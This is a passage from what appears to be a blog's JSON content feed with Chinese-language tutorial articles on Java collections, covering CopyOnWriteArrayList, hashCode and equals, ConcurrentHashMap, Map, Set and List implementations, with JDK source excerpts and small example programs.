list（跳表）是一种可以代替平衡树的数据结构，默认是按照Key值升序的。Skip list让已排序的数据分布在多层链表中，以0-1随机数决定一个数据的向上攀升与否，通过”空间来换取时间”的一个算法。ConcurrentSkipListMap提供了一种线程安全的并发访问的排序映射表。内部是SkipList（跳表）结构实现，在理论上能够在O（log（n））时间内完成查找、插入、删除操作。 Reference Java并发——同步容器与并发容器 - https://www.cnblogs.com/shijiaqi1066/p/3412275.html java并发编程——并发容器和并发工具介绍 - https://my.oschina.net/powerisam/blog/678073 【JDK】：Java容器框架——同步容器与并发容器 - https://blog.csdn.net/u011080472/article/details/51418850","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】集合类 - CopyOnWriteArrayList","date":"2019-03-18T08:27:33.000Z","path":"2019/03/18/【Java】集合类-CopyOnWriteArrayList/","text":"背景CopyOnWriteArrayList容器是Collections.synchronizedList(List list)的替代方案。 CopyOnWriteArrayList在某些情况下具有更好的性能（读操作远多于写操作时）。在传统的使用 synchronized 关键字以保证互斥操作的实现中（比如 Vector），通常会把读操作进行加锁，因而任一时刻只能有一个读线程能够获得锁，所以其他的读线程都必须等待，大大影响性能。 CopyOnWriteArrayList称为“写时复制”容器，就是在多线程对容器对象进行读写操作时，执行写操作的线程在写的同时，还会把容器复制一份（并对复制后的容器实例进行写修改操作），最终就可以做到写操作进行的同时，不阻塞其他线程的读操作。 从JDK1.5开始Java并发包里提供了两个使用CopyOnWrite机制实现的并发容器，它们是CopyOnWriteArrayList和CopyOnWriteArraySet。 CopyOnWriteArrayListCopyOnWriteArrayList实现先说说CopyOnWriteArrayList容器的实现原理。 简单地说，就是在需要对容器进行操作的时候，将容器拷贝一份，对容器的修改操作都在容器的拷贝副本中进行。当修改操作结束，再用容器的拷贝副本替换掉原来的容器。 这样设计的好处是实现了读写分离，并且读读时不会发生阻塞。 下面的源码是CopyOnWriteArrayList的add方法实现： 12345678910111213141516171819202122232425262728public void add(int index, E element) &#123; final ReentrantLock lock = this.lock; lock.lock(); try &#123; Object[] elements = getArray(); int len = elements.length; if (index &gt; len || index &lt; 0) throw new IndexOutOfBoundsException(\"Index: \"+index+ \", Size: \"+len); Object[] newElements; int numMoved = len - index; //1、复制出一个新的数组 if (numMoved == 0) newElements = Arrays.copyOf(elements, len + 1); else &#123; newElements = new Object[len + 1]; System.arraycopy(elements, 0, newElements, 0, index); System.arraycopy(elements, index, newElements, index + 1, numMoved); &#125; //2、把新元素添加到新数组中 newElements[index] = element; //3、把数组指向原来的数组 setArray(newElements); &#125; finally &#123; lock.unlock(); &#125; &#125; 上面的三个步骤实现了写时复制的思想，在读数据的时候不会锁住list，因为写操作是在原来容器的拷贝上进行的。而且，可以看到，如果对容器拷贝修改的过程中又有新的读线程进来，那么读到的还是旧的数据。读的代码如下： 1234567public E get(int index) &#123; return get(getArray(), index); &#125;final Object[] getArray() &#123; return array; &#125; 适用场景CopyOnWriteArrayList 允许在写操作的同时进行读操作，因而大大提高了读操作的性能，因此很适合读多写少的应用场景，比如白名单，黑名单，商品类目的访问和更新场景，而不适合内存敏感以及对实时性要求很高的场景。 CopyOnWriteArrayList容器允许并发读，读操作是无锁的，性能较高。至于写操作，比如向容器中添加一个元素，则首先将当前容器复制一份，然后在新副本上执行写操作，结束之后再将原容器的引用指向新容器。 优缺点分析了解了CopyOnWriteArrayList的实现原理，分析它的优缺点及使用场景就很容易了。 优点： 读操作性能很高，因为无需任何同步措施，比较适用于读多写少的并发场景。Java的list在遍历时，若中途有别的线程对list容器进行修改，则会抛出ConcurrentModificationException异常。而CopyOnWriteArrayList由于其”读写分离”的思想，遍历和修改操作分别作用在不同的list容器，所以在使用迭代器进行遍历时候，也就不会抛出ConcurrentModificationException异常了 缺点： 缺点也很明显： 一是内存占用问题，毕竟每次执行写操作都要将原容器拷贝一份，数据量大时，对内存压力较大，可能会引起频繁GC； 二是无法保证数据不一致，Vector对于读写操作均加锁同步，可以保证读和写的强一致性。而CopyOnWriteArrayList由于其实现策略的原因，写和读分别作用在新老不同容器上，在写操作执行过程中，读虽然不会阻塞，但读取到的却是老容器的数据（或者说是旧数据）。 CopyOnWriteArraySet原理：基于CopyOnWriteArrayList实现，其唯一的不同是在add时调用的是CopyOnWriteArrayList的addIfAbsent方法，其遍历当前Object数组，如Object数组中已有了当前元素，则直接返回，如果没有则放入Object数组的尾部，并返回。 Reference CopyOnWriteArrayList实现原理及源码分析 - https://www.cnblogs.com/chengxiao/p/6881974.html","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】hashCode()","date":"2019-03-18T04:48:20.000Z","path":"2019/03/18/【Java】对象-hashCode/","text":"背景哈希表（Hash Table）这个数据结构想必大多数人都不陌生，而且在很多地方都会利用到哈希表（Hash Table）来提高查找效率。在Java的Object类中有一个方法: 1public native int hashCode(); 根据这个方法的声明可知，该方法返回一个int类型的数值，并且是本地方法，因此在Object类中并没有给出具体的实现。 为何Object类需要这样一个方法？它有什么作用呢？今天我们就来具体探讨一下hashCode方法。 hashCode() 的作用对于包含容器类型的程序设计语言来说，基本上都会涉及到hashCode。 在Java中也一样，hashCode()方法的主要作用，是为了配合基于散列的集合一起正常运行，这样的散列集合包括HashSet、HashMap以及HashTable。 为什么这么说呢？考虑一种情况，当向散列集合中插入一个对象时，如何判别在集合中是否已经存在该对象了？ 注意：散列集合中不允许重复的元素存在。 也许大多数人都会想，到调用equals()方法来逐个进行比较。 这个方法确实可行。但是如果集合中已经存在一万条数据或者更多的数据，如果采用equals()方法去逐一比较，效率必然是一个问题。 此时，hashCode() 方法的作用就体现出来了。 当集合要添加新的对象时，先调用这个对象的hashCode方法，得到对应的hashcode值，实际上在HashMap的具体实现中会用一个table保存已经存进去的对象的hashcode值，如果table中没有该hashcode值，它就可以直接存进去，不用再进行任何比较了；如果存在该hashcode值， 就调用它的equals方法与新元素进行比较，相同的话就不存了，不相同就散列其它的地址。 所以，这里存在一个冲突解决的问题，这样一来实际调用equals方法的次数就大大降低了，说通俗一点：Java中的hashCode方法就是根据一定的规则将与对象相关的信息（比如对象的存储地址，对象的字段等）映射成一个数值，这个数值称作为散列值。 下面这段代码是java.util.HashMap的中put方法的具体实现： 12345678910111213141516171819public V put(K key, V value) &#123; if (key == null) return putForNullKey(value); int hash = hash(key.hashCode()); int i = indexFor(hash, table.length); for (Entry&lt;K,V&gt; e = table[i]; e != null; e = e.next) &#123; Object k; if (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123; V oldValue = e.value; e.value = value; e.recordAccess(this); return oldValue; &#125; &#125; modCount++; addEntry(hash, key, value, i); return null;&#125; put方法是用来向HashMap中添加新的元素。 从put方法的具体实现可知，会先调用hashCode方法得到该元素的hashCode值，然后查看table中是否存在该hashCode值，如果存在则调用equals方法重新确定是否存在该元素，如果存在，则更新value值，否则将新的元素添加到HashMap中。 从这里可以看出，hashCode方法的存在是为了减少equals方法的调用次数，从而提高程序效率。 根据hashcode值判断对象相等有人可能会问，可以直接根据hashcode值判断两个对象是否相等吗？ 肯定是不可以的。 因为不同的对象可能会生成相同的hashcode值，这时发生了哈希碰撞（hash collision）。 虽然不能根据hashcode值判断两个对象是否相等，但是可以直接根据hashcode值判断两个对象不等。 如果两个对象的hashcode值不等，则必定是两个不同的对象。如果要判断两个对象是否真正相等，必须通过equals方法。 也就是说，对于两个对象： 如果调用equals方法得到的结果为true，则两个对象的hashcode值必定相等； 如果equals方法得到的结果为false，则两个对象的hashcode值不一定不同； 如果两个对象的hashcode值不等，则equals方法得到的结果必定为false； 如果两个对象的hashcode值相等，则equals方法得到的结果未知。 equals方法和hashCode方法在有些情况下，程序设计者在设计一个类的时候为需要重写equals方法，比如String类。 但是千万要注意，在重写equals方法的同时，必须重写hashCode方法。 为什么这么说呢？ 下面看一个例子： 12345678910111213141516171819202122232425262728293031323334class People &#123; private String name; private int age; public People(String name, int age) &#123; this.name = name; this.age = age; &#125; public void setAge(int age) &#123; this.age = age; &#125; @Override public boolean equals(Object obj) &#123; // TODO Auto-generated method stub return this.name.equals(((People) obj).name) &amp;&amp; this.age == ((People) obj).age; &#125;&#125;public class Test &#123; public static void main(String[] args) &#123; People p1 = new People(\"Jack\", 12); System.out.println(p1.hashCode()); HashMap&lt;People, Integer&gt; hashMap = new HashMap&lt;People, Integer&gt;(); hashMap.put(p1, 1); People p2 = new People(\"Jack\", 12); System.out.println(hashMap.get(p2)); &#125;&#125; 分析在这里我只重写了equals方法，也就说如果两个People对象，如果它的姓名和年龄相等，则认为是同一个人。 这段代码本来的意愿是想这段代码输出结果为“1”，但是事实上它输出的是“null”。 为什么呢？原因就在于重写equals方法的同时忘记重写hashCode方法。 虽然通过重写equals方法使得逻辑上姓名和年龄相同的两个对象被判定为相等的对象（跟String类类似），但是要知道默认情况下，hashCode方法是将对象的存储地址进行映射。那么上述代码的输出结果为“null”就不足为奇了。原因很简单，p1指向的对象和p2指向的对象，它们的存储地址肯定不同。 所以在hashmap进行get操作时，因为得到的hashcdoe值不同（注意，上述代码也许在某些情况下会得到相同的hashcode值，不过这种概率比较小，因为虽然两个对象的存储地址不同也有可能得到相同的hashcode值），所以导致在get方法中for循环不会执行，直接返回null。 因此如果想上述代码输出结果为“1”，很简单，只需要重写hashCode方法，让equals方法和hashCode方法始终在逻辑上保持一致性。 比如，在 People 类中，这样增加对hashCode() 方法的重写。 123456789class People&#123; ... @Override public int hashCode() &#123; // TODO Auto-generated method stub return name.hashCode()*37+age; &#125;&#125; 这样一来的话，输出结果就为“1”了。 覆写（overwrite）equals()时的准则 自反性（reflexive）。对于任意不为null的引用值x，x.equals(x)一定是true。 对称性（symmetric）。对于任意不为null的引用值x和y，当且仅当x.equals(y)是true时，y.equals(x)也是true。 传递性（transitive）。对于任意不为null的引用值x、y和z，如果x.equals(y)是true，同时y.equals(z)是true，那么x.equals(z)一定是true。 一致性（consistent）。对于任意不为null的引用值x和y，如果用于equals比较的对象信息没有被修改的话，多次调用时x.equals(y)要么一致地返回true要么一致地返回false。 对于任意不为null的引用值x，x.equals(null)返回false。 对于Object类来说，equals()方法在对象上实现的是差别可能性最大的等价关系，即，对于任意非null的引用值x和y，当且仅当x和y引用的是同一个对象，该方法才会返回true。 需要注意的是当equals()方法被override时，hashCode()也要被override。按照一般hashCode()方法的实现来说，相等的对象，它们的hash code一定相等。 Reference 浅谈Java中的hashcode方法 - https://www.cnblogs.com/dolphin0520/p/3681042.html Java提高篇——equals()与hashCode()方法详解 - https://www.cnblogs.com/Qian123/p/5703507.html 面试官爱问的equals与hashCode - https://juejin.im/post/5a4379d4f265da432003874c","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】集合类 - ConcurrentHashMap","date":"2019-03-18T03:55:10.000Z","path":"2019/03/18/【Java】集合类-ConcurrentHashMap/","text":"出现背景1 线程不安全的HashMap因为多线程环境下，使用Hashmap进行put操作会引起死循环（infinite loop），导致CPU利用率接近100%（【Java】集合类 - HashMap 的并发问题），所以在并发情况下不能使用HashMap。 2 效率低下的HashTable容器HashTable容器使用synchronized来保证线程安全，但在线程竞争激烈的情况下HashTable的效率非常低下。 因为当一个线程访问HashTable的同步方法时，其他线程访问HashTable的同步方法时，可能会进入阻塞或轮询状态。如线程1使用put进行添加元素，线程2不但不能使用put方法添加元素，并且也不能使用get方法来获取元素，所以竞争越激烈效率越低。 对于Hashtable而言，synchronized是针对整张Hash表的，即每次锁住整张表让线程独占。相当于所有线程进行读写时都去竞争一把锁，导致效率非常低下。 3 ConcurrentHashMap的锁分段技术HashTable容器在竞争激烈的并发环境下表现出效率低下的原因，是因为所有访问HashTable的线程都必须竞争同一把锁。 那假如容器里有多把锁，每一把锁用于锁容器其中一部分数据，那么当多线程访问容器里不同数据段的数据时，线程间就不会存在锁竞争，从而可以有效的提高并发访问效率，这就是ConcurrentHashMap所使用的锁分段技术。 即首先将数据分成一段一段的存储，然后给每一段数据配一把锁，当一个线程占用锁访问其中一个段数据的时候，其他段的数据也能被其他线程访问。 另外，ConcurrentHashMap可以做到读取数据不加锁，并且其内部的结构可以让其在进行写操作的时候能够将锁的粒度保持地尽量地小，不用对整个ConcurrentHashMap加锁。 ConcurrentHashMap的内部结构 ConcurrentHashMap是由Segment数组结构和HashEntry数组结构组成。 Segment继承了ReentrantLock，所以它就是一种可重入锁（Reentrant Lock）。在ConcurrentHashMap，一个Segment就是一个子哈希表，Segment里维护了一个HashEntry数组，并发环境下，对于不同Segment的数据进行操作是不用考虑锁竞争的。 一个ConcurrentHashMap里包含一个Segment数组，Segment的结构和HashMap类似，是一种数组和链表结构， 一个Segment里包含一个HashEntry数组，每个HashEntry是一个链表结构的元素， 每个Segment守护着一个HashEntry数组里的元素，当对HashEntry数组的数据进行修改时，必须首先获得它对应的Segment锁。 从上面的结构我们可以了解到，ConcurrentHashMap定位一个元素的过程需要进行两次Hash操作，第一次Hash定位到Segment，第二次Hash定位到元素所在的链表的头部。 因此，这一种结构的带来的副作用是Hash的过程要比普通的HashMap要长，但是带来的好处是写操作的时候可以只对元素所在的Segment进行加锁即可，不会影响到其他的Segment， 这样，在最理想的情况下，ConcurrentHashMap可以最高同时支持Segment数量大小的写操作（刚好这些写操作都非常平均地分布在所有的Segment上），所以，通过这一种结构，ConcurrentHashMap的并发能力可以大大的提高。 JDK 1.8中的实现改进JDK 1.7中ConcurrentHashMap最主要采用segment，多线程竞争会先锁住segment，在其put操作中会先定位segment位置，再定位segment中具体桶位置。 在 JDK 1.8中，抛弃了Segment分段锁机制，利用Node数组+CAS+Synchronized来保证并发更新的安全，底层采用数组+链表+红黑树的存储结构。 Reference 站在巨人肩膀上看源码-ConcurrentHashMap - https://segmentfault.com/a/1190000015221462 ConcurrentHashMap实现原理及源码分析 - https://www.cnblogs.com/chengxiao/p/6842045.htmls 探索 ConcurrentHashMap 高并发性的实现机制 - https://www.ibm.com/developerworks/cn/java/java-lo-concurrenthashmap/index.html","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】集合类-Map","date":"2019-03-18T02:59:51.000Z","path":"2019/03/18/【Java】集合类-Map/","text":"Map接口Map接口以按键-值对（key-value）的形式存储数据，这里要特别说明，Map.Entry是Map的内部类，它用来描述Map中一个的键-值对（key-value）。 类图结构 如上图所示是实现Map接口的类图结构，主要包含了如下实现类： HashMap类：HashMap是实现了Map接口的key-value集合，实现了所有map的操作，允许key和value为null,它相当于Hashtable，与之存在的区别是hashMap不是线程安全的，HashMap允许null值。 TreeMap类：TreeMap是基于红黑树的实现，也是记录了key-value的映射关系，该映射根据key的自然排序进行排序或者根据构造方法中传入的比较器进行排序，也就是说TreeMap是有序的key-value集合 Hashtable类：它是类似与HashMap的key-value的哈希表，不允许key-value为NULL值，另外一点值得注意的是Hashtable是线程安全的 区别实现 HashMap：实现了Map接口，继承了AbstractMap类 Hashtable：实现了Map接口，继承了AbstractMap类 TreeMap：由于TreeMap是有序的，所以其除了实现了Map接口，还实现了SortedMap、NavigableMap接口 LinkedHashMap 内部原理 HashMap:HashMap是散列表实现，内部是数组+链表或者红黑树的结构 Hashtable：Hashtable也是散列表实现，内部是数组+链表的结构 TreeMap：TreeMap内部是红黑树的结构 线程安全 HashMap：不是线程安全的，其实通过Map m = Collections.synchronizeMap(hashMap)的方式也可以使得HashMap变成线程安全的，但是这样做对程序的性能可能是噩梦，在后面会介绍ConcurrentHashMap，建议在多线程的情况下可以使用ConcurrentHashMap替换HashMap. Hashtable：是线程安全的，内部方法使用关键字synchronized修饰 TreeMap：不是线程安全的 遍历Map迭代 Map中的元素不存在直接的方法。如果要查询某个 Map以了解其哪些元素满足特定查询，或如果要迭代其所有元素，则你必须首先获取该 Map的“视图”。共有三种视图。 以下是返回视图的 Map方法。通过使用这些方法返回的对象，可以遍历 Map中的元素，也可以删除 Map中的元素。 entrySet()返回 Map中所包含映射的 Set视图。 Set 中的每个元素都是一个 Map.Entry对象，可以使用 getKey()和 getValue()方法（还有一个 setValue()方法）访问后者的键元素和值元素。 keySet()返回 Map中所包含键的 Set 视图。删除 Set中的元素还将删除 Map中相应的映射（键和值）。 values()返回 map中所包含值的 Collection视图。删除 Collection中的元素还将删除 Map中相应的映射（键和值）。 HashMapHashMap是最常用的Map，它根据键的hashCode值存储数据，根据键可以直接获取它的值，具有很快的访问速度，遍历时，取得数据的顺序是完全随机的。因为键对象不可以重复，所以HashMap最多只允许一条记录的键为Null，允许多条记录的值为Null，是非同步的 HashtableHashtable与HashMap类似，是HashMap的线程安全版，它支持线程的同步，即任一时刻只有一个线程能写Hashtable，因此也导致了Hashtale在写入时会比较慢，它继承自Dictionary类，不同的是它不允许记录的键或者值为null，同时效率较低。 ConcurrentHashMap线程安全，并且锁分离。ConcurrentHashMap内部使用段(Segment)来表示这些不同的部分，每个段其实就是一个小的hash table，它们有自己的锁。只要多个修改操作发生在不同的段上，它们就可以并发进行。 LinkedHashMapLinkedHashMap保存了记录的插入顺序，在用Iteraor遍历LinkedHashMap时，先得到的记录肯定是先插入的，在遍历的时候会比HashMap慢，有HashMap的全部特性。 TreeMapTreeMap实现SortMap接口，能够把它保存的记录根据键排序，默认是按键值的升序排序（自然顺序），也可以指定排序的比较器，当用Iterator遍历TreeMap时，得到的记录是排过序的。不允许key值为空，非同步的。 Reference JAVA学习-Map详解 - https://www.jianshu.com/p/38ba8d5200da 详解Java中Map用法 - https://blog.csdn.net/guomutian911/article/details/45771621","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】集合类-遍历Map对象的几种方式","date":"2019-03-18T02:40:50.000Z","path":"2019/03/18/【Java】集合类-遍历Map对象的几种方式/","text":"方式一 - foreach 遍历键值对这是最常见的并且在大多数情况下也是最可取的遍历方式，在键值都需要时使用。 1234Map&lt;Integer, Integer&gt; map = new HashMap&lt;Integer, Integer&gt;(); for (Map.Entry&lt;Integer, Integer&gt; entry : map.entrySet()) &#123; System.out.println(\"Key = \" + entry.getKey() + \", Value = \" + entry.getValue()); &#125; 方法二 - foreach 遍历键或值如果只需要map中的键或者值，可以通过keySet或values来实现遍历，而不是用entrySet。 123456789Map&lt;Integer, Integer&gt; map = new HashMap&lt;Integer, Integer&gt;(); //遍历map中的键 for (Integer key : map.keySet()) &#123; System.out.println(\"Key = \" + key); &#125; //遍历map中的值 for (Integer value : map.values()) &#123; System.out.println(\"Value = \" + value); &#125; 该方法比entrySet遍历在性能上稍好（快了10%），而且代码更加干净。 方法三 - Iterator使用泛型123456Map&lt;Integer, Integer&gt; map = new HashMap&lt;Integer, Integer&gt;(); Iterator&lt;Map.Entry&lt;Integer, Integer&gt;&gt; entries = map.entrySet().iterator(); while (entries.hasNext()) &#123; Map.Entry&lt;Integer, Integer&gt; entry = entries.next(); System.out.println(\"Key = \" + entry.getKey() + \", Value = \" + entry.getValue()); &#125; 不使用泛型12345678Map map = new HashMap(); Iterator entries = map.entrySet().iterator(); while (entries.hasNext()) &#123; Map.Entry entry = (Map.Entry) entries.next(); Integer key = (Integer)entry.getKey(); Integer value = (Integer)entry.getValue(); System.out.println(\"Key = \" + key + \", Value = \" + value); &#125; 你也可以在keySet和values上应用同样的方法。 该种方式看起来冗余却有其优点所在。首先，在老版本 Java 中这是惟一遍历map的方式。 另一个好处是，你可以在遍历时调用iterator.remove()来删除entries，另两个方法则不能。 根据javadoc的说明，如果在for-each遍历中尝试使用此方法，结果是不可预测的。 方法四 - 通过键找值遍历（效率低）1234Map&lt;Integer, Integer&gt; map = new HashMap&lt;Integer, Integer&gt;(); for (Integer key : map.keySet()) &#123; Integer value = map.get(key); System.out.println(\"Key = \" + key + \", Value = \" + value); 作为方法一的替代，这个代码看上去更加干净；但实际上它相当慢且无效率。因为从键取值是耗时的操作（与方法一相比，在不同的Map实现中该方法慢了20%~200%）。如果你安装了FindBugs，它会做出检查并警告你关于哪些是低效率的遍历。所以尽量避免使用。 Reference JAVA学习-Map详解 - https://www.jianshu.com/p/38ba8d5200da 详解Java中Map用法 - https://blog.csdn.net/guomutian911/article/details/45771621 Java遍历Map对象的四种方式 - https://cloud.tencent.com/developer/article/1076314","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】集合类-集合框架","date":"2019-03-15T07:54:22.000Z","path":"2019/03/15/【Java】集合类-集合框架/","text":"集合框架Collection接口集合框架（均实现了Collection接口）有自己的接口和实现，主要分为Set接口，List接口和Queue接口。 它们有各自的特点： Set接口里存放的对象是无序，不能重复的，集合中的对象不按特定的方式排序，只是简单地把对象加入集合中。 List接口是一个有序的集合，同时也是可以重复的，List关注的是索引，拥有一系列和索引相关的方法，查询速度快。因为往list集合里插入或删除数据时，会伴随着后面数据的移动，所有插入删除数据速度慢。 Queue接口的工作原理是 FCFS 算法（First Come, First Serve）。 Map接口 Map接口并未继承Collection接口。 Map接口中存储的是键值对，键不能重复，值可以重复。根据键得到值，对map集合遍历时先得到键的set集合，对set集合进行遍历，得到相应的值。 对比 有序性 允许元素重复否 Collection 否 是 List 是 是 Set AbstractSet 否 否 Set HashSet 否 Set TreeSet 是（用二叉树排序） 否 Map AbstractMap 否 使用key-value来映射和存储数据，Key必须惟一，value可以重复 Map HashMap 否 使用key-value来映射和存储数据，Key必须惟一，value可以重复 Map TreeMap 是（用二叉树排序） 使用key-value来映射和存储数据，Key必须惟一，value可以重复 List接口List 接口对Collection接口进行了简单的扩充，它的具体实现类常用的有ArrayList、LinkedList和Vector。 实现 List 接口的数据结构允许重复元素，可通过 index 访问元素。 ArrayList从其命名中可以看出它是一种类似数组的形式进行存储，因此它的随机访问速度极快。 而LinkedList的内部实现是链表，它适合于在链表中间需要频繁进行插入和删除操作。 Set接口Set接口也是 Collection的一种扩展，而与List不同的时，在Set中的对象元素不能重复，也就是说你不能把同样的东西两次放入同一个Set容器中。它的常用具体实现有HashSet、LinkedHashSet和TreeSet类。 HashSet能快速定位一个元素，但是你放到HashSet中的对象需要实现hashCode()方法。 而TreeSet则将放入其中的元素按某种指定的顺序存放，这就要求你放入其中的对象是可排序的。 Queue接口队列（Queue）是计算机中的一种数据结构，保存在其中的数据具有“先进先出（FIFO，First In First Out）”的特性。 队列具体的实现有很多种办法，例如，可以使用数组做存储，可以使用链表做存储。 队列的两种形式在Java中，队列分为2种形式： 单向队列 循环队列（Deque） Map接口Map接口是一种把键对象（key）和值对象（value）进行关联的容器，而一个值对象又可以是一个Map，依次类推，这样就可形成一个多级映射。 对于键对象来说，像Set一样，一个Map容器中的键对象不允许重复，这是为了保持查找结果的一致性；如果有两个键对象一样，那你想得到那个键对象所对应的值对象时就有问题了，可能你得到的并不是你想的那个值对象，结果会造成混乱，所以键的唯一性很重要，也是符合集合的性质的。 当然在使用过程中，某个键所对应的值对象可能会发生变化，这时会按照最后一次修改的值对象与键对应。对于值对象则没有唯一性的要求。你可以将任意多个键都映射到一个值对象上，这不会发生任何问题（不过对你的使用却可能会造成不便，你不知道你得到的到底是那一个键所对应的值对象）。 Map接口有两种比较常用的实现： HashMap和TreeMap。 TreeMap保存了对象的排列次序，而HashMap则不能。 HashMap用到了哈希码的算法，以便快速查找一个键. TreeMap则是对键按序存放，因此它便有一些扩展的方法，比如firstKey()，lastKey()等，你还可以从TreeMap中指定一个范围以取得其子Map。键和值的关联很简单，用pub (Object key,Object value)方法即可将一个键与一个值对象相关联。用get(Object key)可得到与此key对象所对应的值对象。 遍历 在类集中提供了以下四种的常见输出方式： for循环 foreach输出：JDK1.5之后提供的新功能，可以输出数组或集合。 Iterator：迭代输出，是使用最多的输出方式。 for的形式123for（int i=0; i&lt;arr.size(); i++） &#123; ...&#125; foreach的形式123for（int i：arr）&#123; ...&#125; iterator（迭代器）的形式12345Iterator it = arr.iterator();while(it.hasNext())&#123; object o =it.next(); ...&#125; Fast-fail 规则快速失败（fail-fast）在用迭代器（iterator）遍历一个集合对象时，如果遍历过程中通过集合对象并使其内容发生了修改（增加、删除、修改），则会抛出ConcurrentModificationException。 迭代器在遍历时直接访问集合中的内容，并且在遍历过程中使用一个 modCount 变量。集合在被遍历期间如果内容发生变化，就会改变 modCount 的值。每当迭代器使用hasNext()/next() 遍历下一个元素之前，都会检测 modCount 变量是否为expectedmodCount 值，是的话就返回遍历值；否则抛出异常，终止遍历。 注意，java.util包下的集合类都是快速失败的，不能在多线程下发生并发修改（迭代过程中被修改）。 Reference HashSet HashTable HashMap的区别 及其Java集合介绍 - https://www.cnblogs.com/ywl925/p/3865269.htm Java 集合类汇总 - https://juejin.im/entry/591faeb7570c35006998ec65 一文快速了解Java集合框架 - http://www.importnew.com/31223.html Java集合–Set(基础) - https://www.jianshu.com/p/b48c47a42916 搞懂 HashSet &amp; LinkedHashSet 源码以及集合常见面试题目 - https://juejin.im/post/5ad6313df265da2386706662 Java提高篇（三四）—–fail-fast机制 - https://www.cnblogs.com/chenssy/p/3870107.html Java集合–Queue队列介绍 - https://www.jianshu.com/p/b3676b3f2bb7 Java集合（七） Queue详解 - https://juejin.im/post/5a3763ed51882506a463b740#heading-4","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】集合类-Set","date":"2019-03-15T07:47:09.000Z","path":"2019/03/15/【Java】集合类-Set/","text":"Set接口Set接口继承于Collection接口，是一个不允许出现重复元素，并且无序的集合，主要有HashSet和TreeSet两大实现类。 在判断重复元素的时候，Set集合会调用hashCode()和equal()方法来实现。 主要实现类 HashSet：底层数据结构是哈希表（hash table），主要利用HashMap的key来存储元素，计算插入元素的hashCode来获取元素在集合中的位置，； TreeSet：底层数据结构为红黑树结构，每一个元素都是树中的一个节点，插入的元素都会进行排序； LinkedHashSet：不允许重复的元素，底层数据结构为哈希表（hash table）+双链表，其中由链表保证元素的排序， 由哈希表证元素的唯一性 HashSetHashSet实现Set接口，底层由HashMap来实现（后面进行分析），为哈希表结构，新增元素相当于HashMap的key，value默认为一个固定的Object。在我看来，HashSet相当于一个阉割版的HashMap。 当有元素插入的时候，会计算元素的hashCode值，将元素插入到哈希表对应的位置中来。 特点 不允许出现重复因素； 允许插入Null值； 元素无序（添加顺序和遍历顺序不一致）； 线程不安全，若2个线程同时操作HashSet，必须通过代码实现同步； HashSet的add(E e)方法让我们来看看HashSet的add(E e)方法： 123public boolean add(E e) &#123; return map.put(e, PRESENT)==null;&#125; 在底层HashSet调用了HashMap的put(K key, V value)方法。 TreeSet从名字上可以看出，此集合的实现和树结构有关。 与HashSet集合类似，TreeSet基于TreeMap来实现的，其底层结构为红黑树（特殊的二叉查找树）。 与HashSet不同的是，TreeSet具有排序功能，分为自然排序（123456）和自定义排序两类，默认是自然排序；在程序中，我们可以按照任意顺序将元素插入到集合中，等到遍历时TreeSet会按照一定顺序输出–倒序或者升序。 当我们希望自定义排序时，有两种方法实现： 让待排序类实现 Comparable 接口，其中的 public int compareTo(T o); 必须要被重写。 或者不让待排序类实现 Comparable 接口，而需要单独定义一个新类，这个新类要实现 Comparator 接口，其中的 int compare(T o1, T o2); 必须要被重写。 特点 对插入的元素进行排序，是一个有序的集合（这是主要与HashSet的区别）; 底层使用红黑树结构，而不是哈希表结构； 允许插入Null值； 不允许插入重复元素； 线程不安全。 LinkedHashSet具有HashSet的查询速度，且内部使用链表维护元素的顺序（插入的次序）。于是在使用迭代器遍历LinkedHashSet时，结果会按元素插入的次序显示。","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】集合类-List","date":"2019-03-15T07:45:21.000Z","path":"2019/03/15/【Java】集合类-List/","text":"List集合实现List接口的类包括ArrayList、LinkedList、Vector、Stack等。 ArrayList 基于可变数组实现，是一个数组队列，可以动态地增加容量，非线程安全。 LinkedList基于双向链表实现，可以被当做栈（Stack）使用，非线程安全。 Vector基于可变数组实现，是一个矢量队列，是线程安全的。 Stack基于数组实现，是栈（Stack），它继承自Vector，特性是FILO（先进后出）。 LinkedList是链表，因此适合用在增删操作较多，而查询操作较少的场景；ArrayList则相反，适用于查询操作较多，而增删操作较少的场景。 Vector和ArrayList的区别 Vector是线程安全的，而ArrayList不是线程安全的。如果不考虑到线程的安全因素，一般用ArrayList效率比较高。 如果集合中的元素的数目大于目前集合数组的长度时，Vector增长率为目前数组长度的100%，而ArrayList增长率为目前数组长度的50%。如果在集合中使用数据量比较大的数据，用Vector有一定的优势。 如果查找一个指定位置的数据，Vector和ArrayList使用的时间是相同的，如果频繁的访问数据，这个时候使用Vector和ArrayList都可以。而如果移动一个指定位置会导致后面的元素都发生移动，这个时候就应该考虑到使用LinkList，因为它移动一个指定位置的数据时，其它元素不移动。 ArrayList 